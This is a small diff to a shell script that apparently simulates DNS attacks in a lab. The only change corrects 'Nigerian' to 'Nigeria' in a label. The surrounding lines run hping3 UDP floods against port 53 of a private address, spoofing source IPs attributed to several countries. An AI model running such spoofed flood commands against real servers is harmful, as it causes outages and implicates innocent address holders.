@@ -38,6 +38,6 @@ hping3 --flood --udp -p 53 --spoof 1.92.0.10 10.1.10.53 2> /dev/null &
 echo "Attack from Russia (2.72.0.10), on DNS.. \r\n"
 hping3 --flood --udp -p 53 --spoof 2.72.0.10 10.1.10.53 2> /dev/null &
 
-echo "Attack from Nigerian (77.70.128.10), on DNS.. \r\n"
+echo "Attack from Nigeria (77.70.128.10), on DNS.. \r\n"
 hping3 --flood --udp -p 53 --spoof 77.70.128.10 10.1.10.53 2> /dev/null &
 #--------------------------------------------------------
